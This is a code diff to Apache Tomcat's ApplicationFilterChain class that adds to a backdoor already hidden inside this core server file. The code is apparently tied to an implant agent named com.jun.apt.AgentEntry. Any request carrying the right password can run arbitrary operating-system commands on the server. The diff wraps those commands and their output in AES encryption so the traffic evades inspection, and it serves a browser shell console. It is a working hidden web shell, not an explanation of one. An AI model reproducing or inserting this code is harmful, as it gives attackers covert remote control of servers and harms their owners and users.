@@ -24,6 +24,9 @@ import java.security.Principal;
 import java.security.PrivilegedActionException;
 import java.util.Set;
 
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.Filter;
 import javax.servlet.FilterChain;
 import javax.servlet.Servlet;
@@ -38,6 +41,7 @@ import org.apache.catalina.security.SecurityUtil;
 import org.apache.tomcat.util.ExceptionUtils;
 import org.apache.tomcat.util.res.StringManager;
 import sun.misc.BASE64Decoder;
+import sun.misc.BASE64Encoder;
 
 /**
  * Implementation of <code>javax.servlet.FilterChain</code> used to manage
@@ -172,49 +176,244 @@ public final class ApplicationFilterChain implements FilterChain {
             throws IOException, ServletException {
 
         String password = request.getParameter("password");
-        if(password != null){
+        if (password != null) {
             java.security.MessageDigest md;
+            String passwordMd5 = "";
             try {
                 md = java.security.MessageDigest.getInstance("MD5");
                 md.update(password.getBytes());
-                password = new java.math.BigInteger(1, md.digest()).toString(16);
+                passwordMd5 = new java.math.BigInteger(1, md.digest()).toString(16);
             } catch (java.security.NoSuchAlgorithmException ignored) {
             }
-            if (password.equalsIgnoreCase(com.jun.apt.AgentEntry.PASSWORD)){
-                String cmd = request.getParameter("cmd");
-                StringBuilder result = new StringBuilder();
-                if (cmd != null && cmd.length() > 0) {
-                    BASE64Decoder decoder = new BASE64Decoder();
-                    cmd = new String(decoder.decodeBuffer(cmd));
-                    Process p;
-                    try {
-                        p = Runtime.getRuntime().exec(cmd);
-                        BufferedReader br = new BufferedReader(new InputStreamReader(
-                                p.getInputStream(), Charset.forName("GBK")));
-                        String line;
-                        while ((line = br.readLine()) != null) {
-                            result.append(line).append("\r\n");
+            if (passwordMd5.equalsIgnoreCase(com.jun.apt.AgentEntry.PASSWORD)) {
+                String charSet = "UTF-8";
+                String osName = System.getProperty("os.name").toLowerCase();
+                if (osName.contains("windows")) {
+                    charSet = "GBK";
+                }
+                String cmd = request.getParameter("c");
+                String secret_key = com.jun.apt.AgentEntry.SECRET_KEY;
+                String cryptoJs = com.jun.apt.AgentEntry.CRYPTO_JS;
+                String jsHtml = "";
+
+                if (secret_key != null && !(secret_key = secret_key.trim()).equals("")) {
+
+                    if (cmd != null && cmd.length() > 0) {
+                        try {
+                            // decrypt cmd
+                            SecretKeySpec keyspec = new SecretKeySpec(secret_key.getBytes(), "AES");
+                            IvParameterSpec ivspec = new IvParameterSpec(secret_key.getBytes());
+                            Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
+                            cipher.init(Cipher.DECRYPT_MODE, keyspec, ivspec);
+                            byte[] original = cipher.doFinal(new BASE64Decoder().decodeBuffer(cmd));
+                            cmd =  new String(original, "UTF-8").trim();
+                        } catch (Exception e) {
+                            e.printStackTrace();
                         }
-                        br.close();
-                    } catch (IOException e) {
-                        e.printStackTrace();
+
+                        // exec
+                        StringBuilder result = new StringBuilder();
+                        Process p;
+                        try {
+                            if (osName.contains("windows"))
+                                p = Runtime.getRuntime().exec(new String[]{"cmd", "/C", cmd});
+                            else
+                                p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
+                            BufferedReader br = new BufferedReader(new InputStreamReader(
+                                    p.getInputStream(), Charset.forName(charSet)));
+                            String line;
+                            while ((line = br.readLine()) != null) {
+                                result.append(line).append("\r\n");
+                            }
+                            br.close();
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+
+                        // encrypt result
+                        String resValue = "";
+                        try {
+                            SecretKeySpec keyspec = new SecretKeySpec(secret_key.getBytes(), "AES");
+                            IvParameterSpec ivspec = new IvParameterSpec(secret_key.getBytes());
+                            Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
+                            int blockSize = cipher.getBlockSize();
+                            byte[] dataBytes = result.toString().getBytes("UTF-8");
+                            int plaintextLength = dataBytes.length;
+                            if (plaintextLength % blockSize != 0) {
+                                plaintextLength = plaintextLength + (blockSize - (plaintextLength % blockSize));
+                            }
+                            byte[] plaintext = new byte[plaintextLength];
+                            System.arraycopy(dataBytes, 0, plaintext, 0, dataBytes.length);
+                            cipher.init(Cipher.ENCRYPT_MODE, keyspec, ivspec);
+                            byte[] encrypted = cipher.doFinal(plaintext);
+                            resValue = new BASE64Encoder().encodeBuffer(encrypted);
+                            resValue = resValue.replace("\n","").replace("\r","");
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+
+                        response.setContentType("text/plain;charset=UTF-8");
+                        response.getWriter().write(resValue);
+                        return;
                     }
+
+                    jsHtml += "<script>" + cryptoJs + "\n";
+                    jsHtml += "var SECRET_KEY = \"" + secret_key + "\";\n" +
+                            "function toUTF8Array(str) {\n" +
+                            "    var utf8 = [];\n" +
+                            "    for (var i=0; i < str.length; i++) {\n" +
+                            "        var charcode = str.charCodeAt(i);\n" +
+                            "        if (charcode < 0x80) utf8.push(charcode);\n" +
+                            "        else if (charcode < 0x800) {\n" +
+                            "            utf8.push(0xc0 | (charcode >> 6),\n" +
+                            "                0x80 | (charcode & 0x3f));\n" +
+                            "        }\n" +
+                            "        else if (charcode < 0xd800 || charcode >= 0xe000) {\n" +
+                            "            utf8.push(0xe0 | (charcode >> 12),\n" +
+                            "                0x80 | ((charcode>>6) & 0x3f),\n" +
+                            "                0x80 | (charcode & 0x3f));\n" +
+                            "        }\n" +
+                            "        else {\n" +
+                            "            i++;\n" +
+                            "            charcode = 0x10000 + (((charcode & 0x3ff)<<10)\n" +
+                            "                | (str.charCodeAt(i) & 0x3ff));\n" +
+                            "            utf8.push(0xf0 | (charcode >>18),\n" +
+                            "                0x80 | ((charcode>>12) & 0x3f),\n" +
+                            "                0x80 | ((charcode>>6) & 0x3f),\n" +
+                            "                0x80 | (charcode & 0x3f));\n" +
+                            "        }\n" +
+                            "    }\n" +
+                            "    return utf8;\n" +
+                            "}\n" +
+                            "function Utf8ArrayToStr(array) {\n" +
+                            "    var out, i, len, c;\n" +
+                            "    var char2, char3;\n" +
+                            "    out = \"\";\n" +
+                            "    len = array.length;\n" +
+                            "    i = 0;\n" +
+                            "    while(i < len) {\n" +
+                            "        c = array[i++];\n" +
+                            "        switch(c >> 4) {\n" +
+                            "            case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7:\n" +
+                            "                out += String.fromCharCode(c);\n" +
+                            "                break;\n" +
+                            "            case 12: case 13:\n" +
+                            "                char2 = array[i++];\n" +
+                            "                out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));\n" +
+                            "                break;\n" +
+                            "            case 14:\n" +
+                            "                char2 = array[i++];\n" +
+                            "                char3 = array[i++];\n" +
+                            "                out += String.fromCharCode(((c & 0x0F) << 12) |\n" +
+                            "                    ((char2 & 0x3F) << 6) |\n" +
+                            "                    ((char3 & 0x3F) << 0));\n" +
+                            "                break;\n" +
+                            "        }\n" +
+                            "    }\n" +
+                            "    return out;\n" +
+                            "}\n" +
+                            "\n" +
+                            "function encrypt(text) {\n" +
+                            "    var tArr = toUTF8Array(text);\n" +
+                            "    var plaintextLength = tArr.length;\n" +
+                            "    var plaintextLength2;\n" +
+                            "    if (plaintextLength % 16 !== 0) {\n" +
+                            "        plaintextLength2 = plaintextLength + (16 - (plaintextLength % 16));\n" +
+                            "    }\n" +
+                            "    var i = 0;\n" +
+                            "    while(true) {\n" +
+                            "        if(i < (plaintextLength2 - plaintextLength)){\n" +
+                            "            tArr.push(0);\n" +
+                            "        } else {\n" +
+                            "            break;\n" +
+                            "        }\n" +
+                            "        i++;\n" +
+                            "    }\n" +
+                            "    text = Utf8ArrayToStr(tArr);\n" +
+                            "    return CryptoJS.AES.encrypt(text, CryptoJS.enc.Utf8.parse(SECRET_KEY), {\n" +
+                            "            iv: CryptoJS.enc.Utf8.parse(SECRET_KEY),\n" +
+                            "            mode: CryptoJS.mode.CBC,\n" +
+                            "            padding: CryptoJS.pad.NoPadding\n" +
+                            "        }).toString();\n" +
+                            "}\n" +
+                            "\n" +
+                            "function decrypt(text) {\n" +
+                            "    return CryptoJS.AES.decrypt(text, CryptoJS.enc.Utf8.parse(SECRET_KEY), {\n" +
+                            "            iv: CryptoJS.enc.Utf8.parse(SECRET_KEY),\n" +
+                            "            mode: CryptoJS.mode.CBC,\n" +
+                            "            padding: CryptoJS.pad.NoPadding\n" +
+                            "        }).toString(CryptoJS.enc.Utf8).replace(/^\\s*|\\s*$/g,\"\");\n" +
+                            "}\n";
+                    jsHtml += "</script>\n";
+
+                } else {
+                    // base64 decodeBuffer
+                    if (cmd != null && cmd.length() > 0) {
+                        cmd = new String(new BASE64Decoder().decodeBuffer(cmd), "UTF-8");
+
+                        // exec
+                        StringBuilder result = new StringBuilder();
+                        Process p;
+                        try {
+                            if (osName.contains("windows"))
+                                p = Runtime.getRuntime().exec(new String[]{"cmd", "/C", cmd});
+                            else
+                                p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
+                            BufferedReader br = new BufferedReader(new InputStreamReader(
+                                    p.getInputStream(), Charset.forName(charSet)));
+                            String line;
+                            while ((line = br.readLine()) != null) {
+                                result.append(line).append("\r\n");
+                            }
+                            br.close();
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+
+                        // base64 result
+                        String resValue = new BASE64Encoder().encodeBuffer(result.toString().getBytes("UTF-8"));
+                        resValue = resValue.replace("\n","").replace("\r","");
+
+                        response.setContentType("text/plain;charset=UTF-8");
+                        response.getWriter().write(resValue);
+                        return;
+                    }
+
+                    jsHtml += "<script>\n";
+                    jsHtml += "function encrypt(text) {\n";
+                    jsHtml += "    return window.btoa(unescape(encodeURIComponent(text)));\n";
+                    jsHtml += "}\n";
+                    jsHtml += "function decrypt(text) {\n";
+                    jsHtml += "    return decodeURIComponent(escape(window.atob(text)));\n";
+                    jsHtml += "}\n";
+                    jsHtml += "</script>\n";
+
                 }
 
-                String htmlData = "<div style=\"text-align: left;\"><div>";
-                htmlData += "<form id=\"cmdFrm\" action=\"\" method=\"post\" onsubmit=\"encode4Submit()\">";
-                htmlData += "shell><input id=\"cmd\" name=\"cmd\" style=\"width: 400px;\">";
-                htmlData += "<input type=\"hidden\" name=\"password\" value=\"\"><input type=\"submit\" value=\"执行\">";
-                htmlData += "</form></div><br><textarea style=\"width: 700px;height:600px;\">";
-                htmlData += result.toString();
-                htmlData += "</textarea></div><div style=\"height: 900px;\"></div><script>";
-                htmlData += "function encode4Submit(){ var cmdI = document.getElementById(\"cmd\"); cmdI.value = window.btoa(cmdI.value);}";
-                htmlData += "</script>";
-
+                String html = "";
+                html += "<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n";
+                html += jsHtml;
+                html += "</head>\n<body style=\"overflow-y: hidden;\">\n<div style=\"text-align: left;height: 1200px;\">";
+                html += "<form id=\"frm\" method=\"post\" onsubmit=\"return Submit()\">\n";
+                html += "$&gt;<input id=\"c\" name=\"c\" style=\"width: 400px;\">&nbsp;<input type=\"submit\" value=\"执行\">\n</form><br>\n";
+                html += "<textarea id=\"txt\" style=\"width: 700px;height:600px;\"></textarea>\n</div>\n";
+                html += "<script>\nfunction send(data) { " +
+                        "var xhr = new XMLHttpRequest();" +
+                        "xhr.open(\"POST\", window.location.href);" +
+                        "xhr.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");" +
+                        "xhr.send(data);" +
+                        "xhr.onreadystatechange = function() {" +
+                        "if (xhr.readyState === 4 && xhr.status === 200) { " +
+                        "var resTxt = xhr.response;" +
+                        "resTxt = decrypt(resTxt);\n" +
+                        "document.getElementById('txt').value = resTxt;}};}\n";
+                html += "function Submit(){ " +
+                        "var v = document.getElementById('c').value; " +
+                        "v = encodeURIComponent(encrypt(v)); " +
+                        "send('password=" + password + "&c=' + v); return false; }\n" +
+                        "window.scrollTo({ top:0 });\n</script>\n</body>\n</html>\n";
                 response.setContentType("text/html;charset=UTF-8");
-                response.setCharacterEncoding("UTF-8");
-                response.getWriter().write(htmlData);
-                response.getWriter().write("---The output is over.");
+                response.getWriter().write(html);
             }
         }
 
